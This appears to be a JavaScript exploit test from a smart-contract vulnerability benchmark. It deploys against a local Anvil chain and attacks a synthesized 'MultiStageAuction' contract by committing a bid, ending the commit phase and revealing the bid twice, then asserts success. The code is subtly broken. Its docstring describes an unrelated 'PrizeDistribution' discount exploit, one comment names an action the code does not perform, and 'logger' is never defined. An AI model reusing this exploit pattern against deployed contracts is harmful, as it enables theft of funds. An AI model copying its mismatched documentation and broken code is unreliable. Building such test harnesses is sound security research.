require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');



// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'MultiStageAuction-1.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');


/**
 * Attempts to exploit a vulnerability in the PrizeDistribution smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */

async function exploit(web3, envInfo, contractAddress) {
    let solcVersion = extractSolcVersion(source);
    let { abi } = await compileWithVersion(source, contractFileFullName, 'MultiStageAuction', solcVersion);
    console.log(abi)
    let contract = await new web3.eth.Contract(abi, contractAddress);
    console.log(contract)
    
    // Prepare bid details
    let amount = 5000;  // A large bid amount
    let secret = "newsecret";
    let hashedBid = await contract.methods.getHashFromInput(amount, secret).call();

    // Step 1: Commit the bid
    await contract.methods.commitBid(hashedBid).send({
        from: envInfo.accounts[0],
        gas: 500000
    });
    await sleep(1000);

    // Manually end commit phase (if needed for the exploit)
    await contract.methods.endCommitPhase().send({
        from: envInfo.accounts[0],
        gas: 500000
    });
    await sleep(1000);

    // Step 2: Reveal the bid and attempt to end the auction improperly
    await contract.methods.revealBid(amount, secret).send({
        from: envInfo.accounts[0],
        gas: 500000
    });
    await sleep(1000);

    // Try to end the auction again (exploit faulty finalization logic)
    await contract.methods.revealBid(amount, secret).send({
        from: envInfo.accounts[0],
        gas: 500000
    });
    await sleep(1000);

    let highestBid = await contract.methods.highestBid().call();
    let isSuccessful = highestBid == amount;

    if (isSuccessful) {
        return true;
    }
    return false; 
}


/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
